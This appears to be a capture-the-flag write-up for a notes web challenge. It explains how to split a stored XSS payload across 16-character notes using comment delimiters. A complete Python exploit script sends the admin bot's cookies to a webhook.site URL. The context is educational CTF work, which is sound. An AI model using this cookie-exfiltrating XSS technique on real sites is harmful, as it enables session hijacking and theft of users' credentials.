üîë Step 1: Vulnerability Identification

My investigation started with locating where the FLAG is stored. After thorough research, I discovered something interesting:

üîí The flag is set as a cookie, but only when an admin accesses /user/uuid-admin from localhost.

This meant that even if I had the admin's UUID, I couldn't directly access the flag from my machine. I needed to find a way to make the admin send the flag to me. ü§î

The /report/:id endpoint seemed promising - it likely lets us send our note page to an admin for review. If an admin visits our notes page, we could potentially use XSS (Cross-Site Scripting) to make them execute commands on our behalf!

However, I quickly identified a significant limitation: the character limit per note. The application restricts:

  • üë§ Normal users: maximum 16 characters per note
  • üëë Admin users: maximum 42 characters per note

Since connecting to localhost was impossible from my position (preventing me from becoming an admin), I had to figure out how to make just 16 characters sufficient for a working XSS payload.

Examining how notes were inserted into the HTML, I noticed each note was contained within <li></li> tags. That's when it hit me! üí°

üéØ Key Insight: I could insert multiple notes to build my complete payload piece by piece! My strategy would be to use HTML comments to neutralize the automatically inserted closing tags, allowing me to construct a complete XSS attack across multiple notes.

To confirm this theory, I tested a simple XSS payload split across two notes:

  • <script>alert(/* - First note (16 chars)
  • */1)</script> - Second note (14 chars)

The alert successfully appeared, confirming my approach would work! üéâ

üíª Step 2: Exploit Development

Now I needed to develop a payload that would make the admin send me their cookies (containing the flag). I decided to use an <img> tag with an onerror attribute that would redirect to my webhook with the cookies as URL parameters:

<img onerror="location='https://webhook.site/<WEBHOOK_ID>?'+document.cookie" src=x>

But this payload is much longer than 16 characters! üò± The solution was to split it into multiple notes, with each fragment under 16 characters, using comment syntax to bridge them:

‚ú® Clever technique: Using /* and */ comment delimiters allowed me to split JavaScript code across multiple notes while maintaining execution flow.

import requests, time, json

"""
<img onerror="location='https://webhook.site/<WEBHOOK_ID>?'+document.cookie" src=x>
"""

WEBHOOK = "https://webhook.site/<WEBHOOK_ID>" + "?"

# Splitted payload into fragments <= 16 chars each
notes = [
    '<img onerror="/*',  # Opening tag and start of onerror with comment
    '*/location=/*'      # Beginning of location assignment
]

# Split the webhook URL into chunks of 9 characters each
for i in range(0, len(WEBHOOK), 9):
    notes.append("*/'" + WEBHOOK[i:i+9] + "'+/*")

# Add the remaining parts of the payload
notes += [
    '*/document/*',      # Start document object reference
    '*/.cookie/*',       # Access cookie property
    '*/" src=x>'        # Close attribute and tag
]

# Verify that all note fragments are within the 16-character limit
assert all([len(n) <= 16 for n in notes])

URL = "http://rush-hour.ctf.umasscybersec.org/"

# Get session to maintain cookies
s = requests.Session()
s.get(URL)

# Publish all note fragments
for n in notes:
    s.post(URL+"create", data={'note': n})

# Report our notes page to the admin
r = s.get(URL+f"report/{s.cookies.get('user')}")
print("‚úÖ Report sent to admin. Check your webhook for incoming data!")

üß† How this works:

  1. The script creates multiple notes that, when rendered together, form a complete XSS payload
  2. When the admin visits our notes page through the report feature, the payload executes
  3. The admin's browser sends their cookies (including the flag) to our webhook
